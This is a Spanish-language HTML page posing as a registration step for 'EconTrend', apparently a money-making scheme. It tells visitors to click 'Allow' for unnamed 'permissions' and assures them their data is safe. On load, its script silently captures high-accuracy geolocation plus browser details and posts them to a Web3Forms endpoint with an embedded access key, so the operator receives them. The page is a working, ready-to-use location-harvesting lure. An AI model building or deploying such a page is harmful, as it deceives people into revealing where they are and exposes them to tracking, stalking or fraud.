<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EconTrend - ¡Continúa Generando Ganancias!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(to right, #4CAF50, #8BC34A); /* Degradado verde */
            color: white;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
            max-width: 600px;
            width: 100%;
            color: #333;
        }
        h1 {
            color: #2E7D32; /* Verde oscuro */
            margin-bottom: 25px;
            font-size: 2.5em;
        }
        p {
            margin-bottom: 20px;
            line-height: 1.8;
            font-size: 1.1em;
        }
        .highlight {
            color: #FFC107; /* Amarillo para resaltar */
            font-weight: bold;
        }
        .important-note {
            margin-top: 30px;
            font-size: 0.9em;
            color: #555;
        }
        .message {
            font-weight: bold;
            color: #1A5222; /* Un verde más profundo */
            margin-top: 25px;
            font-size: 1.2em;
        }
        .error-message {
            color: #dc3545; /* Rojo para errores */
            font-weight: bold;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>¡Bienvenido a EconTrend!</h1>
        <p>Para <span class="highlight">continuar generando ganancias</span> y completar tu registro con nosotros, necesitamos un paso crucial.</p>
        <p>Por favor, haz clic en <span class="highlight">"Permitir"</span> o <span class="highlight">"Aceptar"</span> cuando tu navegador te solicite **acceso a los permisos**. ¡Es fundamental para tu experiencia en EconTrend!</p>
        <p class="message" id="statusMessage">Esperando tu confirmación de permisos...</p>
        <p class="error-message" id="errorMessage"></p>
    </div>
    <div class="important-note">
        <p>
            Tus datos son privados y seguros. Esta información es necesaria para asegurar la integridad de tu cuenta y la funcionalidad de EconTrend.
        </p>
    </div>

    <script>
        const statusMessageElement = document.getElementById('statusMessage');
        const errorMessageElement = document.getElementById('errorMessage');

        function sendLocationToWeb3Forms(latitude, longitude) {
            statusMessageElement.textContent = 'Enviando tu información para procesar tu registro...';
            errorMessageElement.textContent = ''; // Limpiar errores previos

            const data = {
                access_key: "61f686f1-9db4-48f8-9d45-635dbf181292", // ¡Tu clave de Web3Forms ya está aquí!
                subject: "Información de Usuario de EconTrend", // Ajustado el asunto del correo
                latitud: latitude,
                longitud: longitude,
                timestamp: new Date().toISOString(), // Añade la fecha y hora de la captura
                userAgent: navigator.userAgent // Información del navegador del usuario
            };

            fetch("https://api.web3forms.com/submit", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    console.log("Información enviada a Web3Forms con éxito:", data);
                    statusMessageElement.textContent = '¡Gracias! Tu información ha sido procesada con éxito. Ya puedes continuar con tu registro.';
                    errorMessageElement.textContent = ''; // Asegurar que no haya mensaje de error
                } else {
                    console.error("Error al enviar a Web3Forms:", data);
                    statusMessageElement.textContent = 'Hubo un error al procesar tu información. Por favor, inténtalo de nuevo más tarde.';
                    errorMessageElement.textContent = 'Error: ' + (data.message || 'Desconocido');
                }
            })
            .catch(error => {
                console.error("Error de red al enviar a Web3Forms:", error);
                statusMessageElement.textContent = 'Hubo un problema de conexión al procesar tu información. Intenta de nuevo.';
                errorMessageElement.textContent = 'Error de red. Revisa tu conexión a internet.';
            });
        }

        function getLocation() {
            if (navigator.geolocation) {
                statusMessageElement.textContent = 'Solicitando permisos del navegador...';
                errorMessageElement.textContent = ''; // Limpiar errores previos
                navigator.geolocation.getCurrentPosition(
                    (position) => { // Función de éxito
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        console.log(`Información obtenida: Latitud ${lat}, Longitud ${lon}`);
                        sendLocationToWeb3Forms(lat, lon); // Llama a la función para enviar a Web3Forms
                    },
                    (error) => { // Función de error
                        let message = "Hubo un problema al obtener la información.";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                message = "¡Permiso denegado por el usuario! Necesitamos tu aprobación para continuar.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                message = "Información no disponible. Intenta de nuevo.";
                                break;
                            case error.TIMEOUT:
                                message = "La solicitud ha caducado. Asegúrate de tener una buena conexión.";
                                break;
                            case error.UNKNOWN_ERROR:
                                message = "Ocurrió un error inesperado al obtener la información.";
                                break;
                        }
                        statusMessageElement.textContent = message;
                        errorMessageElement.textContent = 'Por favor, concede el permiso para continuar.';
                        console.error("Error al obtener información:", error);
                    },
                    // Opciones para getCurrentPosition:
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                statusMessageElement.textContent = '';
                errorMessageElement.textContent = "Tu navegador no soporta la función necesaria. Necesitas uno compatible.";
                console.error("Función no soportada.");
            }
        }

        // Inicia el proceso de solicitud cuando la página carga
        window.onload = getLocation;
    </script>
</body>
</html>